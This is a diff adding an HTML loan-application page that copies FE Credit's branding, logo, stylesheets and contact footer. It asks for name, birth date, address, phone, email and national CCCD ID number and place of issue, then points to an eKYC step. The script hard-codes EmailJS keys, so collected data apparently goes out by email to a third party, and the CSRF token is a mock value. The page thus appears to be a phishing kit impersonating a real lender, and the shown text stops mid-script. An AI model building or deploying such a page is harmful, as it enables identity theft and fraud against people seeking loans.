@@ -1,0 +1,1676 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>FE Credit - Nhập thông tin</title>
+    <meta name="description" content="Đăng ký vay tiêu dùng FECredit: nhập thông tin cá nhân, số tiền vay, thời hạn và lãi suất. Mẫu đơn trực quan, hỗ trợ xác thực eKYC.">
+    <meta name="keywords" content="vay tiêu dùng, FE Credit, đăng ký vay, lãi suất, eKYC">
+    
+    <!-- External CSS Bundles from index.html -->
+    <link href="https://www.fecredit.com.vn/sb/sitebuilder-ltr-css-bundle.css.ve71a07e0be8131442699d18627f92642a8170edc" media="screen" rel="stylesheet" />
+    <link href="https://www.fecredit.com.vn/sb/sitebuilder-css-bundle.css.ve71a07e0be8131442699d18627f92642a8170edc" media="screen" rel="stylesheet" />
+    <link href="https://www.fecredit.com.vn/sb/sitebuilder-css-small-header-01-sm-bundle.css.ve71a07e0be8131442699d18627f92642a8170edc" media="screen and (min-width:0) and (max-width:991px)" rel="stylesheet" />
+    <link href="https://www.fecredit.com.vn/sb/sitebuilder-css-large-header-07-lg-bundle.css.ve71a07e0be8131442699d18627f92642a8170edc" media="screen and (min-width:992px)" rel="stylesheet" />
+    <link href="https://www.fecredit.com.vn/sb/css-customs-bundle.css.ve71a07e0be8131442699d18627f92642a8170edc" media="screen" rel="stylesheet" />
+    <link href="https://www.fecredit.com.vn/sb/css-footer-bundle.css.ve71a07e0be8131442699d18627f92642a8170edc" media="screen" rel="stylesheet" />
+    
+    <!-- External Libraries -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Be+Vietnam+Pro:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <!-- FECredit Design System - Commented out due to loading issues -->
+    <!-- <link rel="stylesheet" href="https://fecredit.github.io/assets/css/main.css"> -->
+    <!-- <link rel="stylesheet" href="https://fecredit.github.io/assets/css/shared.css"> -->
+    
+    <!-- Shared Components CSS - Commented out due to loading issues -->
+    <!-- <link rel="stylesheet" href="https://fecredit.github.io/assets/css/variables.css"> -->
+    <!-- <link rel="stylesheet" href="https://fecredit.github.io/assets/css/shared-components.css"> -->
+    
+    <!-- Unified Design Tokens - Commented out due to loading issues -->
+    <!-- <link rel="stylesheet" href="../../configs/shared/fecredit-design-tokens.css"> -->
+    
+    <!-- Favicon -->
+    <link rel="shortcut icon" type="image/svg" href="https://www-cdn.fecredit.com.vn/media/yienoinl/favicon-feonl-01.svg?width=32&height=32">
+    
+    <!-- Link to External CSS -->
+    <link rel="stylesheet" href="step1.css">
+</head>
+<body>
+    <!-- Site -->
+    <div id="site">
+        <!-- Subheader -->
+        <div id="site-subheader">
+            <div class="container content">
+                <nav aria-label="" class="sub-header-nav secondary nav-dropdown navigation-dropdown-bg navigation-dropdown-bg-solid">
+                    <ul class="sub-header-list d-flex">
+                        <li>
+                            <span>
+                                <a href="../index.html">Về chúng tôi</a>
+                            </span>
+                        </li>
+                        <li>
+                            <span>
+                                <a href="https://feonline.fecredit.com.vn/" target="_blank" rel="noreferrer noopener">Về FE ONLINE 2.0</a>
+                            </span>
+                        </li>
+                        <li>
+                            <span>
+                                <a href="#site-footer">Liên hệ</a>
+                            </span>
+                        </li>
+                    </ul>
+                    <!--// Site search -->
+                    <div class="form site-search-form site-search" aria-label="">
+                        <form role="search" autocomplete="off" form-group="off" action="https://www.fecredit.com.vn/search/" method="get" name="searchForm">
+                            <div class="form-group">
+                                <input type="text" class="myInput form-control" name="search_field"
+                                       aria-label="" placeholder="Bạn cần tìm gì?"
+                                       value="">
+                            </div>
+                            <button id="search-button" type="submit" role="button"
+                                    aria-label=""
+                                    class="btn base-btn-bg base-btn-bg-solid base-btn-bg-hover-solid base-btn-text base-btn-borders btn-search">
+                                <span></span>
+                                <i aria-hidden="true" class="icon ti ti-search"></i>
+                                <p>Tìm kiếm</p>
+                            </button>
+                        </form>
+                    </div>
+                </nav>
+            </div>
+        </div>
+
+        <!-- Header -->
+        <header id="site-header" class="header-bg header-bg-solid" tabindex="-1">
+            <div class="container">
+                <div class="row justify-content-between">
+                    <div class="d-flex align-items-center nav-left">
+                        <div id="logo">
+                            <a href="../index.html" title="FE CREDIT - VAY TIÊU DÙNG TÍN CHẤP" class="w-100">
+                                <img src="https://www-cdn.fecredit.com.vn/media/20ymppzv/fec-logo.svg" alt="FE CREDIT Logo"
+                                     style="object-fit: contain;width:100%">
+                                <span>FE CREDIT - VAY TIÊU DÙNG TÍN CHẤP</span>
+                            </a>
+                        </div>
+                        <!-- Main navigation -->
+                        <nav aria-label="" id="nav-menu"
+                             class="main nav__menu nav-dropdown align-items-center navigation-dropdown-bg navigation-dropdown-bg-solid">
+                            <ul class="nav__list">
+                                <li class="no-child">
+                                    <span>
+                                        <a class="nav__link d-flex align-items-center justify-content-start text-nowrap" href="../index.html">Trang Chủ</a>
+                                    </span>
+                                </li>
+                                <li class="no-child">
+                                    <span>
+                                        <a class="nav__link d-flex align-items-center justify-content-start text-nowrap" href="Evaluate-conditions.html">Đăng Ký Giải Ngân</a>
+                                    </span>
+                                </li>
+                                <li class="no-child">
+                                    <span>
+                                        <a class="nav__link d-flex align-items-center justify-content-start text-nowrap" href="#site-footer">Liên Hệ</a>
+                                    </span>
+                                </li>
+                            </ul>
+                        </nav>
+                    </div>
+                </div>
+            </div>
+        </header>
+
+        <!-- Content -->
+        <main id="site-content" tabindex="-1">
+
+    <!-- Banner Carousel - Giống index.html -->
+    <section class="content component usn_cmp_bannerheros base-bg base-bg-solid p-0">
+        <div class="component-inner">
+            <div class="banner-hero position-relative" style="overflow: hidden;">
+                <div class="slider-hero" style="width: 100%; height: 100%; max-width: 1920px; margin: 0 auto;">
+                    
+                    <!-- Slide 1 - Đăng Ký Vay Tín Chấp -->
+                    <div class="slider-item c5-bg c5-bg-solid position-relative banner-slide active">
+                        <link rel="preload" as="image" media="(min-width: 768px)" href="https://www-cdn.fecredit.com.vn/media/orjlo45e/banner-destop.jpg" />
+                        <link rel="preload" as="image" media="(max-width: 767px)" href="https://www-cdn.fecredit.com.vn/media/5vbnou1r/banner-mobile.jpg" />
+                        <picture>
+                            <source srcset="https://www-cdn.fecredit.com.vn/media/5vbnou1r/banner-mobile.jpg" media="(max-width: 767px)" />
+                            <img src="https://www-cdn.fecredit.com.vn/media/orjlo45e/banner-destop.jpg" 
+                                 alt="Đăng Ký Vay Tín Chấp" 
+                                 fetchpriority="high" 
+                                 loading="eager" 
+                                 decoding="async" 
+                                 style="object-fit: cover; overflow:hidden; width: 100%; height:100%; position: absolute; top: 0; bottom:0; left:0; right:0;" />
+                        </picture>
+                        <div class="container" style="display:flex; position:relative; flex-direction:column; align-items: flex-start; justify-content:center; min-height: 400px; padding: 40px 20px;">
+                            <div class="slide-content" style="display: flex; flex-direction: column; gap: 20px;">
+                                <h2 class="heading c5-heading">Vay tiêu dùng tín chấp<div class="break"></div>Nhanh chóng - Tiện lợi</h2>
+                                
+                                <!-- Slide Description -->
+                                <div class="slide-description" style="background: rgba(255, 255, 255, 0.95); padding: 20px 24px; border-radius: 16px; max-width: 650px; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);">
+                                    <p style="margin: 0 0 16px 0; font-size: 16px; color: #292929; line-height: 1.6; font-weight: 600;">
+                                        ✨ <strong style="color: #00994F;">Giải pháp tài chính nhanh gọn</strong> - Không cần tài sản thế chấp
+                                    </p>
+                                    <ul style="margin: 0; padding-left: 20px; list-style: none; color: #292929; font-size: 14px; line-height: 1.8;">
+                                        <li style="margin-bottom: 8px;">✓ <strong>Chỉ cần CCCD</strong> và giấy tờ thu nhập</li>
+                                        <li style="margin-bottom: 8px;">✓ <strong>Duyệt hồ sơ nhanh</strong> chỉ 24-48 giờ</li>
+                                        <li style="margin-bottom: 8px;">✓ <strong>Giải ngân ngay</strong> khi được phê duyệt</li>
+                                        <li style="margin-bottom: 0;">✓ <strong>Hỗ trợ 24/7</strong> qua hotline và online</li>
+                                    </ul>
+                                </div>
+                                
+                                <div class="button-card c5-bg c5-bg-solid" style="display:flex; align-items: center; padding: 20px 24px; gap: 20px;">
+                                    <div class="card-text" style="display:flex; flex-direction:column; justify-content: center; flex: 1;">
+                                        <p class="secondary-heading sm c5-secondary-heading" style="margin: 0 0 8px 0;">Lãi suất ưu đãi từ 1.25%/tháng</p>
+                                        <p class="heading c5-heading" style="margin: 0;">Thủ tục đơn giản, duyệt nhanh</p>
+                                    </div>
+                                    
+                                    <p class="link" style="margin: 0; flex-shrink: 0;">
+                                        <a class="btn text-nowrap btn-md base-btn-bg base-btn-bg-solid base-btn-bg-hover-solid base-btn-text c1-btn-borders" href="#registrationForm" style="padding: 14px 32px; font-size: 16px; font-weight: 700; border-radius: 12px;">
+                                            <span></span>
+                                            ĐĂNG KÝ NGAY
+                                        </a>
+                                    </p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- Slide 2 - Tài Chính Linh Hoạt -->
+                    <div class="slider-item c5-bg c5-bg-solid position-relative banner-slide">
+                        <link rel="preload" as="image" media="(min-width: 768px)" href="https://www-cdn.fecredit.com.vn/media/vklipbcj/flexi-hero-banner-destop.png" />
+                        <link rel="preload" as="image" media="(max-width: 767px)" href="https://www-cdn.fecredit.com.vn/media/i5shymbr/flexi-hero-banner-mobile.png" />
+                        <picture>
+                            <source srcset="https://www-cdn.fecredit.com.vn/media/i5shymbr/flexi-hero-banner-mobile.png" media="(max-width: 767px)" />
+                            <img src="https://www-cdn.fecredit.com.vn/media/vklipbcj/flexi-hero-banner-destop.png" 
+                                 alt="Giải pháp tài chính linh hoạt" 
+                                 loading="lazy" 
+                                 decoding="async" 
+                                 style="object-fit: cover; overflow:hidden; width: 100%; height:100%; position: absolute; top: 0; bottom:0; left:0; right:0;" />
+                        </picture>
+                        <div class="container" style="display:flex; position:relative; flex-direction:column; align-items: flex-start; justify-content:center; min-height: 400px; padding: 40px 20px;">
+                            <div class="slide-content" style="display: flex; flex-direction: column; gap: 20px;">
+                                <h2 class="heading c5-heading">Giải pháp tài chính<div class="break"></div>Linh hoạt - Hiện đại</h2>
+                                
+                                <!-- Slide Description -->
+                                <div class="slide-description" style="background: rgba(255, 255, 255, 0.95); padding: 20px 24px; border-radius: 16px; max-width: 650px; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);">
+                                    <p style="margin: 0 0 16px 0; font-size: 16px; color: #292929; line-height: 1.6; font-weight: 600;">
+                                        💰 <strong style="color: #00994F;">Hạn mức lên đến 500 triệu VNĐ</strong> - Đáp ứng mọi nhu cầu
+                                    </p>
+                                    <ul style="margin: 0; padding-left: 20px; list-style: none; color: #292929; font-size: 14px; line-height: 1.8;">
+                                        <li style="margin-bottom: 8px;">✓ <strong>Tiêu dùng cá nhân:</strong> Mua sắm, du lịch, sự kiện</li>
+                                        <li style="margin-bottom: 8px;">✓ <strong>Kinh doanh:</strong> Vốn lưu động, mở rộng quy mô</li>
+                                        <li style="margin-bottom: 8px;">✓ <strong>Kỳ hạn linh hoạt:</strong> 6-60 tháng tùy chọn</li>
+                                        <li style="margin-bottom: 0;">✓ <strong>Thanh toán sớm:</strong> Không phí phạt, ưu đãi lãi suất</li>
+                                    </ul>
+                                </div>
+                                
+                                <div class="button-card c5-bg c5-bg-solid" style="display:flex; align-items: center; padding: 20px 24px; gap: 20px;">
+                                    <div class="card-text" style="display:flex; flex-direction:column; justify-content: center; flex: 1;">
+                                        <p class="secondary-heading sm c5-secondary-heading" style="margin: 0 0 8px 0;">Vay lên đến 500 triệu VNĐ</p>
+                                        <p class="heading c5-heading" style="margin: 0;">Kỳ hạn linh hoạt đến 60 tháng</p>
+                                    </div>
+                                    
+                                    <p class="link" style="margin: 0; flex-shrink: 0;">
+                                        <a class="btn text-nowrap btn-md base-btn-bg base-btn-bg-solid base-btn-bg-hover-solid base-btn-text c1-btn-borders" href="#registrationForm" style="padding: 14px 32px; font-size: 16px; font-weight: 700; border-radius: 12px;">
+                                            <span></span>
+                                            ĐĂNG KÝ NGAY
+                                        </a>
+                                    </p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                </div>
+                <div class="slider-indicator">
+                    <div class="dots">
+                        <span class="dot active" onclick="goToSlide(0)" tabindex="0" onkeydown="if(event.key === 'Enter') goToSlide(0)" role="button" aria-label="Slide 1"></span>
+                        <span class="dot" onclick="goToSlide(1)" tabindex="0" onkeydown="if(event.key === 'Enter') goToSlide(1)" role="button" aria-label="Slide 2"></span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Error Summary Alert -->
+    <div id="errorSummaryAlert" class="alert alert-danger" style="display: none; margin-bottom: 20px; padding: 15px; border-radius: 8px; background-color: #fee; border: 2px solid #e53e3e;">
+        <div style="display: flex; align-items: center; gap: 12px;">
+            <i class="fas fa-exclamation-triangle" style="font-size: 24px; color: #e53e3e;"></i>
+            <div style="flex: 1;">
+                <h4 style="margin: 0 0 8px 0; color: #c53030; font-size: 16px; font-weight: 600;">
+                    ⚠️ Vui lòng kiểm tra thông tin
+                </h4>
+                <p id="errorSummaryText" style="margin: 0; color: #742a2a; font-size: 14px;"></p>
+                <ul id="errorSummaryList" style="margin: 8px 0 0 20px; color: #742a2a; font-size: 13px;"></ul>
+            </div>
+            <button type="button" onclick="document.getElementById('errorSummaryAlert').style.display='none'" style="background: none; border: none; font-size: 24px; color: #c53030; cursor: pointer; padding: 0; line-height: 1;">&times;</button>
+        </div>
+    </div>
+
+    <!-- Steps Progress -->
+    <div class="steps" role="progressbar" aria-label="Registration Progress">
+        <div class="step active" id="step1" aria-current="step">1. THÔNG TIN CÁ NHÂN</div>
+        <div class="step" id="step2">2. THÔNG TIN KHOẢN VAY</div>
+        <div class="step" id="step3">3. XÁC THỰC eKYC</div>
+    </div>
+
+    <!-- Progress Indicator -->
+    
+    <div class="step1-container">
+        <!-- Form Validation Summary -->
+        <div class="form-validation-summary" id="validationSummary">
+            <div class="validation-summary-title">
+                <i class="fas fa-exclamation-triangle"></i>
+                Vui lòng kiểm tra lại thông tin
+            </div>
+            <ul class="validation-summary-list" id="validationSummaryList">
+                <!-- Validation errors will be populated here -->
+            </ul>
+        </div>
+
+
+        <form id="registrationForm" onsubmit="handleSubmit(event)" novalidate role="form" aria-label="Biểu mẫu đăng ký vay" aria-describedby="validationSummary">
+            <input type="hidden" id="csrf" name="_csrf" value="mock-csrf-token">
+
+            <!-- Personal Information Section -->
+            <div class="form-section">
+                <div class="form-section-header">
+                    <div class="form-section-icon">
+                        <i class="fas fa-user"></i>
+                    </div>
+                    <div>
+                        <h3 class="form-section-title">ĐĂNG KÝ VAY TIÊU DÙNG</h3>
+                        <p class="form-section-subtitle">Vui lòng nhập đầy đủ thông tin cá nhân của bạn</p>
+                    </div>
+                </div>
+                <div class="form-grid">
+                    <div class="form-field has-icon">
+                        <i class="fas fa-id-card form-field-icon"></i>
+                        <label for="fullName" class="form-label">Họ và tên *</label>
+                        <input type="text" class="form-control" id="fullName" name="fullName" autocomplete="name" required aria-describedby="fullNameError" aria-invalid="false" placeholder="Ví dụ: Nguyễn Văn An">
+                        <div class="invalid-feedback" id="fullNameError"></div>
+                    </div>
+
+                    <div class="form-field has-icon">
+                        <i class="fas fa-calendar-alt form-field-icon"></i>
+                        <label for="dob" class="form-label">Ngày sinh *</label>
+                        <input type="text" class="form-control" id="dob" name="dob" autocomplete="bday" required aria-describedby="dobError" aria-invalid="false" placeholder="dd/mm/yyyy">
+                        <div class="invalid-feedback" id="dobError"></div>
+                    </div>
+                    
+                    <div class="form-field has-icon">
+                        <i class="fas fa-venus-mars form-field-icon"></i>
+                        <label for="gender" class="form-label">Giới tính *</label>
+                        <select class="form-control custom-select" id="gender" name="gender" autocomplete="sex" required aria-describedby="genderError" aria-invalid="false">
+                            <option value="">Chọn giới tính</option>
+                            <option value="Nam">Nam</option>
+                            <option value="Nữ">Nữ</option>
+                            <option value="Khác">Khác</option>
+                        </select>
+                        <div class="invalid-feedback" id="genderError"></div>
+                    </div>
+
+                    <div class="form-field has-icon form-grid-full">
+                        <i class="fas fa-map-marker-alt form-field-icon"></i>
+                        <label for="contactAddress" class="form-label">Địa chỉ thường trú *</label>
+                        <input type="text" class="form-control" id="contactAddress" name="contactAddress" autocomplete="street-address" required aria-describedby="contactAddressError" aria-invalid="false" placeholder="Số nhà, đường, phường/xã, quận/huyện, tỉnh/thành">
+                        <div class="invalid-feedback" id="contactAddressError"></div>
+                    </div>
+
+                    
+                    <div class="form-field has-icon">
+                        <i class="fas fa-id-card form-field-icon"></i>
+                        <label for="cccd" class="form-label">
+                            Số CMND/CCCD *
+                            <i class="fas fa-question-circle tooltip-icon" data-bs-toggle="tooltip" data-bs-placement="top" title="CCCD gồm 12 chữ số, xem mặt trước thẻ căn cước. Ví dụ: 001234567890"></i>
+                        </label>
+                        <input type="text" class="form-control" id="cccd" name="cccd" autocomplete="off" required maxlength="12" aria-describedby="cccdError" placeholder="Nhập 12 chữ số CCCD">
+                        <div class="invalid-feedback" id="cccdError"></div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Contact Information Section -->
+            <div class="form-section">
+                <div class="form-section-header">
+                    <div class="form-section-icon">
+                        <i class="fas fa-phone"></i>
+                    </div>
+                    <div>
+                        <h3 class="form-section-title">Thông tin liên lạc</h3>
+                        <p class="form-section-subtitle">Thông tin để liên hệ và xác thực</p>
+                    </div>
+                </div>
+                <div class="form-grid">
+                    <div class="form-field has-icon">
+                        <i class="fas fa-map-marker-alt form-field-icon"></i>
+                        <label for="issuePlace" class="form-label">
+                            Nơi cấp CMND/CCCD *
+                            <i class="fas fa-question-circle tooltip-icon" data-bs-toggle="tooltip" data-bs-placement="top" title="Thông tin nằm ở mặt sau CCCD, dòng 'Nơi cấp'. Thường là Cục Cảnh sát ĐKQL Cư trú và DLQG về dân cư"></i>
+                        </label>
+                        <select class="form-control custom-select" id="issuePlace" name="issuePlace" required aria-describedby="issuePlaceError">
+                            <option value="">Chọn nơi cấp</option>
+                        <option value="CỤC TRƯỜNG CỤC CẢNH SÁT QUẢN LÝ HÀNH CHÍNH VỀ TTXH">CỤC TRƯỜNG CỤC CẢNH SÁT QUẢN LÝ HÀNH CHÍNH VỀ TTXH</option>
+                        <option value="Cục Cảnh sát ĐKQL Cư trú và DLQG về dân cư">Cục Cảnh sát ĐKQL Cư trú và DLQG về dân cư</option>
+                        </select>
+                        <div class="invalid-feedback" id="issuePlaceError"></div>
+                    </div>
+                    
+                    <div class="form-field has-icon">
+                        <i class="fas fa-phone form-field-icon"></i>
+                        <label for="phone" class="form-label">Số điện thoại *</label>
+                        <input type="tel" class="form-control" id="phone" name="phone" autocomplete="tel" required maxlength="13" aria-describedby="phoneError" placeholder="Ví dụ: 0912345678">
+                        <div class="invalid-feedback" id="phoneError"></div>
+                    </div>
+                    
+                    <div class="form-field has-icon">
+                        <i class="fas fa-envelope form-field-icon"></i>
+                        <label for="email" class="form-label">Email *</label>
+                        <input type="email" class="form-control" id="email" name="email" autocomplete="email" required aria-describedby="emailError" placeholder="example@email.com">
+                        <div class="invalid-feedback" id="emailError"></div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Loan Information và Tài khoản giải ngân đã chuyển sang step2.html -->
+
+            <!-- Navigation -->
+            <div class="step-navigation">
+                <div class="d-flex align-items-center">
+                    <small class="text-muted" style="font-size: 14px;">
+                        <i class="fas fa-shield-alt me-2" style="color: #00994F;"></i>
+                        Thông tin được mã hóa và bảo mật
+                    </small>
+                </div>
+                <button type="button" onclick="goToStep2()" class="btn btn-primary btn-next" id="submitButton" disabled style="background: linear-gradient(135deg, #00994F 0%, #00b359 100%); border: none; padding: 16px 40px; font-size: 18px; font-weight: 700; border-radius: 12px; box-shadow: 0 4px 12px rgba(0, 153, 79, 0.3); transition: all 0.3s ease;">
+                    <span class="btn-text">TIẾP TỤC</span>
+                    <i class="fas fa-arrow-right btn-icon ms-2"></i>
+                </button>
+            </div>
+        </form>
+    </div>
+
+    <!-- Auto-save indicator -->
+    <div id="autoSaveIndicator" class="auto-save-indicator">
+        <i class="fas fa-save"></i> Đang lưu...
+    </div>
+
+    <!-- Loading Modal with Animation -->
+    <div id="loadingModal" class="loading-modal" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.9); z-index: 9999; justify-content: center; align-items: center; flex-direction: column;">
+        <div class="loading-content" style="text-align: center; padding: 40px; background: white; border-radius: 24px; box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3); max-width: 500px; width: 90%;">
+            <!-- Loading Spinner -->
+            <div class="spinner-container" id="loadingSpinner" style="margin-bottom: 24px;">
+                <div class="spinner-circle" style="width: 80px; height: 80px; border: 6px solid #E8F8EE; border-top: 6px solid #00994F; border-radius: 50%; margin: 0 auto; animation: spin 1s linear infinite;"></div>
+            </div>
+            
+            <!-- Success Icon (hidden initially) -->
+            <div class="success-icon" id="successIcon" style="display: none; margin-bottom: 24px;">
+                <div style="width: 80px; height: 80px; background: #00994F; border-radius: 50%; margin: 0 auto; display: flex; align-items: center; justify-content: center; animation: scaleIn 0.5s ease-out;">
+                    <i class="fas fa-check" style="font-size: 48px; color: white;"></i>
+                </div>
+            </div>
+            
+            <!-- Loading Text -->
+            <div class="loading-text">
+                <h3 id="loadingTitle" style="font-size: 24px; font-weight: 700; color: #00994F; margin-bottom: 12px;">
+                    Đang xem xét kết quả...
+                </h3>
+                <p id="loadingMessage" style="font-size: 16px; color: #666; margin: 0;">
+                    Vui lòng đợi trong giây lát
+                </p>
+            </div>
+            
+            <!-- Progress Bar -->
+            <div class="progress-bar-container" style="width: 100%; height: 8px; background: #E8F8EE; border-radius: 4px; margin-top: 24px; overflow: hidden;">
+                <div class="progress-bar" id="progressBar" style="width: 0%; height: 100%; background: linear-gradient(90deg, #00994F 0%, #9FE870 100%); border-radius: 4px; transition: width 0.3s ease;"></div>
+            </div>
+        </div>
+    </div>
+
+
+        </main>
+        <!--// Content -->
+        <!-- Footer -->
+        <footer id="site-footer" class="footer-bg footer-bg-solid bg-gray-1" tabindex="-1" style="padding-bottom:0px !important">
+            <div class="container">
+                <div class="listing">
+                    <div class="item footer-item usn_pod_footeritem col-lg-0 col-md-0 col-12 col">
+                        <div class="inner">
+                            <div id="footer-item-above" class="d-flex flex-column align-stretch align-items-start gap24 xl:flex-row">
+                                <div class="footer-text d-flex flex-column align-stretch gap32">
+                                    <div class="image">
+                                        <img class="lazyload" loading="lazy" src="https://www-cdn.fecredit.com.vn/media/20ymppzv/fec-logo.svg" alt="logo" />
+                                    </div>
+                                    <h2 class="heading footer-heading">Hiện thực hóa<div class="break"></div>hàng triệu ước mơ</h2>
+                                </div>
+                                <div class="footer-contact d-flex flex-column justify-content-center align-items-start align-stretch p24 gap24 radius24 bg-white">
+                                    <div class="contact-phone d-flex flex-column align-stretch xl:flex-row gap24">
+                                        <div class="new-customer flex-center flex-column align-stretch">
+                                            <p class="contact-title"><i class="ti ti-phone-call contact-icon"></i>Dành cho khách hàng mới</p>
+                                            <a class="phone-link flex-center flex-column fw-700 lh150 radius16 text-uppercase c8-bg c8-bg-solid" href="tel:028 3551 6868">
+                                                <span class="c8-secondary-heading">Hỗ trợ vay nhanh</span>
+                                                <h5 class="heading c8-heading">028 3551 6868</h5>
+                                            </a>
+                                        </div>
+                                        <div class="phone-divider align-stretch bg-gray-2"></div>
+                                        <div class="old-customer gap16 flex-center flex-column align-stretch">
+                                            <p class="contact-title"><i class="ti ti-headphones contact-icon"></i> Dành cho khách hàng hiện hữu</p>
+                                            <div class="list-phone flex-center align-stretch radius16 c9-bg c9-bg-solid">
+                                                <a class="phone-link align-stretch flex-center flex-column fw-700 lh150 text-uppercase" href="tel:1900 6535">
+                                                    <span class="c9-secondary-heading">Khách hàng vay</span>
+                                                    <h5 class="heading c9-heading">1900 6535</h5>
+                                                </a>
+                                                <div class="old-customer-divider"></div>
+                                                <a class="phone-link align-stretch flex-center flex-column fw-700 lh150 text-uppercase" href="tel:1900 6939">
+                                                    <span class="c9-secondary-heading mobile">KH thẻ tín dụng</span>
+                                                    <span class="c9-secondary-heading desktop">Khách hàng thẻ tín dụng</span>
+                                                    <h5 class="heading c9-heading">1900 6939</h5>
+                                                </a>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="divider-contact"></div>
+                                    <div class="other-contact flex-center gap32">
+                                        <div class="social d-flex flex-column justify-content-center align-items-start">
+                                            <p class="contact-title">
+                                                <i class="ti ti-share contact-icon"></i> Kết nối với FE CREDIT nhiều hơn
+                                            </p>
+                                            <div class="social-list d-flex align-items-center">
+                                                <a href="https://www.facebook.com/FECREDIT.VN/" target="_blank" class="social-item flex-center radius1000 overflow-hidden flex-shrink-0">
+                                                    <img loading="lazy" src="https://www-cdn.fecredit.com.vn/media/20qdzdk0/fb44.svg" alt="social-icon" class="lazyload" />
+                                                </a>
+                                                <a href="https://www.instagram.com/fecredit_official/" target="_blank" class="social-item flex-center radius1000 overflow-hidden flex-shrink-0">
+                                                    <img loading="lazy" src="https://www-cdn.fecredit.com.vn/media/rfybl10x/it44.svg" alt="social-icon" class="lazyload" />
+                                                </a>
+                                                <a href="https://www.linkedin.com/company/fe-credit/" target="_blank" class="social-item flex-center radius1000 overflow-hidden flex-shrink-0">
+                                                    <img loading="lazy" src="https://www-cdn.fecredit.com.vn/media/wwfcyngn/lb44.svg" alt="social-icon" class="lazyload" />
+                                                </a>
+                                                <a href="https://www.youtube.com/channel/UCVEbuhfBLKok_Jpl4VZVV1A/about" target="_blank" class="social-item flex-center radius1000 overflow-hidden flex-shrink-0">
+                                                    <img loading="lazy" src="https://www-cdn.fecredit.com.vn/media/104pogye/yb44.svg" alt="social-icon" class="lazyload" />
+                                                </a>
+                                                <a href="https://www.tiktok.com/@fecredit_official" target="_blank" class="social-item flex-center radius1000 overflow-hidden flex-shrink-0">
+                                                    <img loading="lazy" src="https://www-cdn.fecredit.com.vn/media/v15j2slx/tt44.svg" alt="social-icon" class="lazyload" />
+                                                </a>
+                                                <a href="https://zalo.me/FECREDIT" target="_blank" class="social-item flex-center radius1000 overflow-hidden flex-shrink-0">
+                                                    <img loading="lazy" src="https://www-cdn.fecredit.com.vn/media/wzrnvejd/zl44.svg" alt="social-icon" class="lazyload" />
+                                                </a>
+                                            </div>
+                                        </div>
+                                        <div class="address flex-center flex-column align-stretch">
+                                            <p class="contact-title"><i class="ti ti-map-pin contact-icon"></i>Địa chỉ</p>
+                                            <div class="address-content align-stretch flex-column d-flex gap-0">
+                                                <p class="address-title text-gray-8 fw-700 text-uppercase lh150">Phòng Dịch Vụ Khách Hàng</p>
+                                                <div class="address-text text-gray-6 lh150 ls28">
+                                                    <p class="addressFooter">144 Cộng Hòa, Phường Bảy Hiền, Thành phố Hồ Chí Minh.</p>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </footer>
+    </div>
+
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4.4.1/dist/email.min.js"></script>
+    <!-- Logger and Utils -->
+    <script src="../assets/js/logger.js"></script>
+    <script src="../assets/js/utils.js"></script>
+    <script>
+        // EmailJS Configuration - Global scope để accessible từ mọi function
+        const emailjsConfig = {
+            serviceId: window.EMAILJS_SERVICE_ID || 'service_60tgxof', // Fallback cho development
+            templateId: window.EMAILJS_TEMPLATE_ID || 'template_oorgiah',
+            publicKey: window.EMAILJS_PUBLIC_KEY || 'J4YH-lyfEfxXeu7aV'
+        };
+        
+        try {
+            emailjs.init(emailjsConfig.publicKey);
+        } catch (error) {
+            if (window.Logger) {
+                window.Logger.error("Failed to initialize EmailJS", error);
+            }
+            showSecureAlert('Cannot initialize EmailJS. Please check connection or configuration.');
+        }
+
+        let userData = {};
+        let activeIntervals = [];
+        let activeTimeouts = [];
+        
+        // Enhanced Error Handler Utility
+        class ErrorHandler {
+            constructor() {
+                this.errorCount = 0;
+                this.maxErrors = 5;
+                this.errorHistory = [];
+            }
+            
+            handle(error, context = 'Unknown', userMessage = 'Có lỗi xảy ra. Vui lòng thử lại.') {
+                this.errorCount++;
+                
+                // Log error details
+                
+                // Store error history
+                this.errorHistory.push({
+                    error: error.message || error,
+                    context,
+                    timestamp: new Date().toISOString(),
+                    userAgent: navigator.userAgent
+                });
+                
+                if (this.errorCount > this.maxErrors) {
+                    return;
+                }
+                
+                // Show user-friendly message
+                this.showSecureAlert(userMessage, 'error');
+                
+                // Log to monitoring service if available
+                if (window.monitoring && window.monitoring.logError) {
+                    window.monitoring.logError(error, { context, timestamp: new Date().toISOString() });
+                }
+            }
+            
+            showSecureAlert(message, type = 'info') {
+                // Remove existing modal if any
+                $('#secureAlertModal').remove();
+                
+                const iconClass = type === 'error' ? 'fas fa-exclamation-triangle text-danger' : 
+                                 type === 'success' ? 'fas fa-check-circle text-success' : 
+                                 'fas fa-info-circle text-primary';
+                
+                const modal = $(`
